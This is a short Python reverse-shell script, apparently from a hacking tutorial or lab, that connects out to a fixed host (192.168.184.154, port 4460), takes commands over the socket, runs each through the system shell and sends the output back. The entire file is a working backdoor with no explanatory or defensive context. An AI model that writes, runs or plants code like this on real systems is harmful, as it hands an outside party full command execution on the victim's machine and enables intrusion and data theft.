#!/usr/bin/env python
import socket
import  subprocess

def execute_system_commands(command):
    return subprocess.check_output(command, shell=True)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.184.154",4460))
s.send("\n[+] Connection Established\n")

while True:
    command = s.recv(1024)
    command_result = execute_system_commands(command)
    s.sendall(command_result)

s.close()

